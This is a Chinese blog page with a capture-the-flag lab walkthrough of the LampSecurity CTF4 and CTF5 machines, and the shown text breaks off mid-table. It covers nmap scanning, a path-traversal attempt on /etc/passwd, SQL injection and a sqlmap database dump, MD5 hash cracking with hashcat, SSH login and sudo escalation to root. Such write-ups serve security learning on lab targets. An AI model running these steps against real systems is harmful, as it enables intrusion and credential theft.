@@ -1,0 +1,1838 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——靶机精炼-思路为王（二） | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——靶机精炼-思路为王（二）`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"W","cover":"/images/default-cover.webp","path":"2026/03/13/W/"},{"title":"W1R3S 1.0.1 靶机","cover":"/images/default-cover.webp","path":"2026/03/13/W1R3S 1.0.1 靶机/"},{"title":"域渗透","cover":"/images/default-cover.webp","path":"2026/03/13/域渗透/"},{"title":"票据攻击","cover":"/images/default-cover.webp","path":"2026/03/19/票据攻击/"},{"title":"靶机精炼-思路为王（四）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（四）/"},{"title":"靶机精炼-思路为王（三）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（三）/"},{"title":"靶机精炼-思路为王（一）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（一）/"},{"title":"靶机精炼-思路为王（二）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（二）/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">lmlsama</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">kong</span>
+          <span class="main-left--tag">kong</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“井底之蛙，虽不曾见过大海”</p>
+        <p>“但知晓天之湛蓝”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/LMLsama/LMLsama.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>2</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>8 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1494天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">靶机精炼-思路为王（二）</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2026-03-20 14:46:16</p>
+        </div>
+        <img src="/images/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="LampSecurityCTF4-SQL-注入原理，手动注入和-SQLmap-自动化注入一起呈现。"><a href="#LampSecurityCTF4-SQL-注入原理，手动注入和-SQLmap-自动化注入一起呈现。" class="headerlink" title="LampSecurityCTF4 - SQL 注入原理，手动注入和 SQLmap 自动化注入一起呈现。"></a>LampSecurityCTF4 - SQL 注入原理，手动注入和 SQLmap 自动化注入一起呈现。</h1><h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 172.16.200.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613719.png" alt="image-20251107190724117"></p>
+<p><strong>130 为新增靶机</strong></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 172.16.200.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613703.png" alt="image-20251107191028045"></p>
+<p><strong>因为 631 扫出来了也带着试试吧</strong></p>
+<h3 id="TCP-详细信息扫描"><a href="#TCP-详细信息扫描" class="headerlink" title="TCP 详细信息扫描"></a>TCP 详细信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p22,25,80,631 172.16.200.130</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613738.png" alt="image-20251107192300366"></p>
+<p><strong>80 &gt;25 &gt;22</strong></p>
+<h3 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-ports ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞脚本扫描"><a href="#漏洞脚本扫描" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p22,25,80 ip</span><br></pre></td></tr></table></figure>
+
+<h3 id="ipv6-扫描"><a href="#ipv6-扫描" class="headerlink" title="ipv6 扫描"></a>ipv6 扫描</h3><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><strong>80 页面</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613731.png" alt="image-20251107191452100"></p>
+<p><strong>随便点点</strong></p>
+<p><strong>1.page&#x3D;xxx   文件包含</strong></p>
+<p><strong>2.id&#x3D;x  sql 注入</strong></p>
+<p><strong>3.xss</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613700.png" alt="image-20251107191637290"></p>
+<h3 id="1-文件包含的尝试"><a href="#1-文件包含的尝试" class="headerlink" title="1.文件包含的尝试"></a>1.文件包含的尝试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/xxxxxxx?page=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140613708.png" alt="image-20251107191816759"></p>
+<p><strong>失败</strong></p>
+<h3 id="2-SQL-注入"><a href="#2-SQL-注入" class="headerlink" title="2.SQL 注入"></a>2.SQL 注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip/xxx?page=2&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>因为报错，所以存在 sql 注入漏洞</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140615731.png" alt="image-20251107192031893"></p>
+<h2 id="SQLmap-自动注入"><a href="#SQLmap-自动注入" class="headerlink" title="SQLmap 自动注入"></a>SQLmap 自动注入</h2><table>
+<thead>
+<tr>
+<th><strong>场景</strong></th>
+<th><strong>一句话命令</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>1. 只测某参数</strong></td>
+<td><code>-p id</code></td>
+<td><strong>多参数时缩小范围</strong></td>
+</tr>
+<tr>
+<td><strong>2. 自动选 YES</strong></td>
+<td><code>--batch</code></td>
+<td><strong>无人值守跑批量</strong></td>
+</tr>
+<tr>
+<td><strong>3. 多线程</strong></td>
+<td><code>--threads 10</code></td>
+<td><strong>10 线程，别超过 20</strong></td>
+</tr>
+<tr>
+<td><strong>4. 指定库名</strong></td>
+<td><code>--dbms mysql</code></td>
+<td><strong>已知数据库时提速</strong></td>
+</tr>
+<tr>
+<td><strong>5. 当前库</strong></td>
+<td><code>--current-db</code></td>
+<td><strong>先确认业务库名</strong></td>
+</tr>
+<tr>
+<td><strong>6. 当前用户</strong></td>
+<td><code>--current-user</code></td>
+<td><strong>看权限大小</strong></td>
+</tr>
+<tr>
+<td><strong>7. 指定注入技术</strong></td>
+<td><code>--technique BE</code></td>
+<td><strong>仅布尔 + 报错，不加 T 可省时间</strong></td>
+</tr>
+<tr>
+<td><strong>8. 随机 UA</strong></td>
+<td><code>--random-agent</code></td>
+<td><strong>绕过初级 WAF</strong></td>
+</tr>
+<tr>
+<td><strong>9. 提高等级</strong></td>
+<td><code>--level 3 --risk 2</code></td>
+<td><strong>测 Cookie&#x2F;Referer，含堆叠查询</strong></td>
+</tr>
+<tr>
+<td><strong>10. 清缓存</strong></td>
+<td><code>--flush-session</code></td>
+<td><strong>换 payload 后必加</strong></td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -u &quot;完整的对应IP&quot; --dbs --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><code>--dbs</code> 枚举数据库操作系统类型</p>
+<p><code>--dump</code> 是 sqlmap 中“<strong>把数据拖回本地</strong>”的核心开关，作用一句话概括：</p>
+<p><strong>让 sqlmap 把指定库&#x2F;表&#x2F;列的实际记录提取到本地屏幕（或文件），而不再只是列出结构。</strong></p>
+<p><strong>想看真实数据就加 <code>--dump</code>，否则只停留在“结构扫描”阶段。</strong></p>
+<p><code>--batch</code> 全 yes</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306514.png" alt="image-20251107193150377"></p>
+<p><strong>看看都干了哪些事情</strong></p>
+<p><strong>连接了目标</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140616469.png" alt="image-20251107194200090"></p>
+<p><strong>，判断版本特征，</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140616952.png" alt="image-20251107194214647"></p>
+<p><strong>判断是 mysql 的哪个版本</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140617920.png" alt="image-20251107194229023"></p>
+<p><strong>布尔盲注，时间盲注，联合查询</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140618677.png" alt="image-20251107194304374"></p>
+<p><strong>找到的数据库</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306515.png" alt="image-20251107194346229"></p>
+<p><strong>找到了 md 值加密的密码，并进行了破解</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306516.png" alt="image-20251107194441238"></p>
+<p><strong>因为有用户名密码了，直接试一下 SSH</strong></p>
+<h2 id="SSH-参数补写"><a href="#SSH-参数补写" class="headerlink" title="SSH 参数补写"></a>SSH 参数补写</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140621248.png" alt="image-20251107194707379"></p>
+<details><summary>报错原因</summary>
+
+</details>
+
+
+<ol>
+<li>**报错逐句拆解  **</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th><strong>原文</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Unable to negotiate with 172.16.200.130 port 22</code></td>
+<td><strong>连接建立成功，但在 SSH 协议握手阶段谈崩了</strong></td>
+</tr>
+<tr>
+<td><code>no matching key exchange method found</code></td>
+<td><strong>找不到双方都支持的****密钥交换算法（KEX）</strong></td>
+</tr>
+<tr>
+<td><code>Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</code></td>
+<td><strong>服务器只支持 3 个老旧算法，全部带</strong><code>sha1</code></td>
+</tr>
+</tbody></table>
+<ol start="2">
+<li>**为什么谈崩  **</li>
+</ol>
+<ul>
+<li>**你的 OpenSSH 客户端版本 ≥ 8.8（2021-09 之后），**<strong>默认禁用所有 sha1 类 KEX</strong>（认为不安全）。</li>
+<li>**远端主机（172.16.200.130）是老旧系统（Cisco&#x2F;老 Linux&#x2F;嵌入式），<strong><strong>只提供 sha1 算法</strong>。</strong>  ** <strong>→ 客户端列表里没有一个能与服务器匹配，于是报错退出。</strong></li>
+</ul>
+<ol start="3">
+<li><strong>两种快速解决思路</strong>  ** **（1）<strong>临时放行</strong>（单次命令，不推荐长期）</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 dstevens@172.16.200.130</span><br></pre></td></tr></table></figure>
+
+<p><strong>或</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 dstevens@172.16.200.130</span><br></pre></td></tr></table></figure>
+
+<p><strong>把服务器提供的算法手动加回本次连接的白名单即可登录。</strong> **（2）**<strong>写进 ssh_config</strong>（对这台主机永久生效）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano /etc/ssh/ssh_config   # 或 ~/.ssh/config</span><br></pre></td></tr></table></figure>
+
+<p><strong>添加段：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host 172.16.200.130</span><br><span class="line">    KexAlgorithms +diffie-hellman-group14-sha1</span><br><span class="line">    Ciphers +aes128-cbc          # 如果后续还提示 cipher 不匹配，也顺手加</span><br><span class="line">    HostKeyAlgorithms +ssh-rsa   # 老服务器 host key 也可能是 ssh-rsa</span><br></pre></td></tr></table></figure>
+
+<p>**保存后以后直接 **<code>ssh dstevens@172.16.200.130</code> 就不会再报该错。</p>
+<ol start="4">
+<li>**安全提醒  **</li>
+</ol>
+<ul>
+<li>**SHA1 已被证明存在碰撞风险，**<strong>仅在对端无法升级、且网络可信时临时使用</strong>。</li>
+<li>**长期方案应升级 172.16.200.130 的 SSH 服务（openssh ≥ 7.8 或设备固件），开启 <strong><code>curve25519-sha256</code>、<code>ecdh-sha2-nistp256</code> 等现代 KEX。</strong> <strong>一句话总结</strong>  ** <strong>客户端“嫌”服务器用的加密方言太老，拒绝握手；手动把老算法加回白名单就能连上，但记得事后让服务器“学新语言”才是根本解决。</strong></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306518.png" alt="image-20251107195422915"></p>
+<p><strong>没有就给他，直接复制粘贴</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140621753.png" alt="image-20251107195524223"></p>
+<p><strong>没有匹配的主机密钥类型</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140622519.png" alt="image-20251107195729250"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140623632.png" alt="image-20251107195804129"></p>
+<h2 id="获得初始-shell"><a href="#获得初始-shell" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><strong>输入对应的密码，成功登录</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140624433.png" alt="image-20251107195938313"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140624462.png" alt="image-20251107195952748"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140625011.png" alt="image-20251107200106338"></p>
+<p><code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140625843.png" alt="image-20251107200138997"></p>
+<p><strong>发现居然有 ALL ALL 权限，提权简单了</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>启动新的一个 bash 进程</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140626526.png" alt="image-20251107200239598"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306519.png" alt="image-20251107200336270"></p>
+<h2 id="总结-工具不重要，要会具体原理，工具被-ban-了，要有手写（ai）的能力"><a href="#总结-工具不重要，要会具体原理，工具被-ban-了，要有手写（ai）的能力" class="headerlink" title="总结    工具不重要，要会具体原理，工具被 ban 了，要有手写（ai）的能力"></a>总结    工具不重要，要会具体原理，工具被 ban 了，要有手写（ai）的能力</h2><p><strong>非常简单的一个靶场，主要思路在于对于注入页面的发现，前期可以使用 nmap 的 vuln 脚本扫描也可以扫描出来 sql 注入，除此之外还有 CSRF</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140627483.png" alt="image-20251107200507163"></p>
+<h1 id="LAMPSecurityCTF5-标准攻击链，却处处需要细心，枚举和信息收集能力才是考验。"><a href="#LAMPSecurityCTF5-标准攻击链，却处处需要细心，枚举和信息收集能力才是考验。" class="headerlink" title="LAMPSecurityCTF5 - 标准攻击链，却处处需要细心，枚举和信息收集能力才是考验。"></a>LAMPSecurityCTF5 - 标准攻击链，却处处需要细心，枚举和信息收集能力才是考验。</h1><h2 id="nmap-扫描-1"><a href="#nmap-扫描-1" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306520.png" alt="image-20251107201901631"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140628239.png" alt="image-20251107201926900"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306521.png" alt="image-20251107202053828"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140629964.png" alt="image-20251107202308889"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306522.png" alt="image-20251107205604777"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140630606.png" alt="image-20251107205630272"></p>
+<details><summary>可能的漏洞点</summary>
+
+</details>
+
+
+<h2 id="Web-渗透-1"><a href="#Web-渗透-1" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p><strong>80 页面</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140631259.png" alt="image-20251107202156112"></p>
+<p><strong>一般来说****BLOG</strong> 页面是最重要看的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306523.png" alt="image-20251107202250665"></p>
+<h2 id="NanoCMS-数据泄漏的利用"><a href="#NanoCMS-数据泄漏的利用" class="headerlink" title="NanoCMS 数据泄漏的利用"></a>NanoCMS 数据泄漏的利用</h2><p><strong>可以看一下它有什么漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nanocms</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306524.png" alt="image-20251107202449975"></p>
+<p><strong>RCE 漏洞远程代码执行，但是要有密码（Authenticated 需要被认证 ）暂时无法用</strong></p>
+<blockquote>
+<p><strong>[!NOTE]</strong></p>
+<details><summary>RCE漏洞是什么？</summary>
+
+</details>
+</blockquote>
+<p><strong>还可以去网上搜</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140633615.png" alt="image-20251107202732836"></p>
+<h3 id="发现-1-和-3-都有-txt-的信息泄露"><a href="#发现-1-和-3-都有-txt-的信息泄露" class="headerlink" title="发现 1 和 3 都有 .txt 的信息泄露"></a>发现 1 和 3 都有 <strong>.txt</strong> 的<strong>信息泄露</strong></h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140633659.png" alt="image-20251107202817590"></p>
+<p><strong>可以试一下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主页/data/pagesdata.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306525.png" alt="image-20251107203046095"></p>
+<p>** 发现**<strong>用户名 密码(应该是 hash 过的)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier &#x27;xxx（上面的一串数字）&#x27; </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320140635054.png" alt="image-20251107203238660"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306526.png" alt="image-20251107203256745"></p>
+<p><strong>最可能是 MD5</strong></p>
+<p><strong>最快其实是用 web 工具</strong></p>
+<h3 id="MD5-破解一下-hashcat"><a href="#MD5-破解一下-hashcat" class="headerlink" title="MD5 破解一下  hashcat"></a>MD5 破解一下  hashcat</h3><h4 id="准备好字典"><a href="#准备好字典" class="headerlink" title="准备好字典"></a>准备好字典</h4><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260320143306527.png" alt="image-20251107203807475"></p>
+<p><strong>进行破解</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>命令段</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sudo</code></td>
+<td><strong>以管理员权限运行（Hashcat 需要访问 GPU 或 CPU 资源）</strong></td>
+</tr>
+<tr>
+<td><code>hashcat</code></td>
+<td><strong>密码破解工具，支持 GPU 加速</strong></td>
+</tr>
+<tr>
+<td><code>-m 0</code></td>
+<td><strong>指定哈希类型为****MD5</strong>（0 是 MD5 的编号）</td>
+</tr>
+<tr>
+<td><code>-a 0</code></td>
+<td><strong>指定攻击模式为****字典攻击</strong>（即逐行读取密码列表）</td>
+</tr>
+<tr>
+<td><code>9d2f75377ac0ab991d40c91fd27e52fd</code></td>
